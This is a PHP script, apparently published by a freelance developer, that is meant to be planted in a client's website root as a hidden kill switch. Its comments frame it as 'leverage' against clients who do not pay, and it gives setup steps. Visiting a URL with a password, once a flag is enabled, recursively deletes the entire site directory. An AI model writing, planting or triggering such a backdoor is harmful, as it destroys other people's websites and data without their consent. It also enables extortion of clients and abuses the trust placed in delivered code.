<?php

/**
*	Writen by nullwriter.com 09/03/2015
*   
*
*	I made this script after I was scammed while doing a freelance work. The person who was supposed to pay me never did, and the day I
* 	realised he wasn't going to pay, I was going to delete the websites I did for him, but he had already changed FTP user and pass.
* 	I realised if I had this type of script, I would still have some leverage even without having account access.
*
*	So I made this in order to have leverage in my future freelance jobs if things ever go south.
*
*	Please make sure you have a backup before using this code. Use at your own risk. This file will selfdestruct with the website.
*/



/**** Instructions ****
*
*	1. Add this file to the root directory of the website.
*	2. Write the siteurl.com/struct.php?setup and follow the setup instructions.	
*	3. Activate the selfdestruct by typing out siteurl.com/struct.php?p=password
*
***********************/



/******* Write your ENCRYPTED PASSWORD below *******/

$pcheck = "7c873ac37a2ccb9b1148e4c3b28c7f99"; // Copy-paste the encrypted password you got after doing the struct.php?setup=password
$flag_active = false;  // Change to TRUE when you want the script to be active.

/***************************************************/








/*************** DO NOT CHANGE ANYTHING BEYOND THIS POINT ***************/

$salt = "JIjwqiojwqhuiH!28921ujns1982nK";

if(isset($_GET['setup']))
{
	if(!empty($_GET['setup']))
	{
		$pass = $_GET['setup'];
		$encrypted = md5($pass.$salt);

		$msg = "<span style='color:green;'>Setup Password working!</span><br/><br />";

		$msg .= "<h2>One:</h2>- Copy this encryped password in the <strong>\$pcheck</strong> variable inside this struct.php file.<br /><br />" .
				"\t\tYour Encrypted pass --> <strong>" . $encrypted . "</strong><br /><br />";

		echo $msg;

		$msg = "<br /><br /><h2>Two:</h2>".
				"- When you're ready to use the struct.php script to selfdestruct a website,<br /><br />".
				"You activate it by typing the following url: <strong> www.thewebsite.com/struct.php?p=".$pass." </strong><br /><br />".
				"Remember this file has to be in the root directory of the website, else you need to specify the root dir manually.";

		echo $msg;
	}
	else
	{
		echo "You need to specify a setup password!";

		$msg = "<br /><br />Type in <strong>thewebsite.com/struct.php?setup=password</strong>";

		echo $msg;
	}
}

$pass = "none";

if(isset($_GET['p']))
	if(!empty($_GET['p']))
		$pass = md5($_GET['p'].$salt);

if($pass != "none")
{
	// check if correct password
	if($pass == $pcheck)
	{
		// self destruct logic
		if($flag_active)
			destro2();
		else
			echo "<h3>Passwords match, website would selfdestruct if \$flag_active variable is set to TRUE.</h3>";
	}
	else
	{
		echo "<h3>wrong pass.</h3>";
	}

}

function destro2()
{
	// Change this if you intend to store this file somewhere other than the root folder.
	$rootdir = getcwd(); 
 	rrmdir($rootdir);
}

function rrmdir($dir) 
{
	  if (is_dir($dir)) 
	  {
		    $objects = scandir($dir);
		    foreach ($objects as $object) 
		    {
			      if ($object != "." && $object != "..") 
			      {
				        if (filetype($dir."/".$object) == "dir") 
				           rrmdir($dir."/".$object); 
				        else unlink   ($dir."/".$object);
			      }
		    }
		    reset($objects);
		    rmdir($dir);
	  }
 }
?>
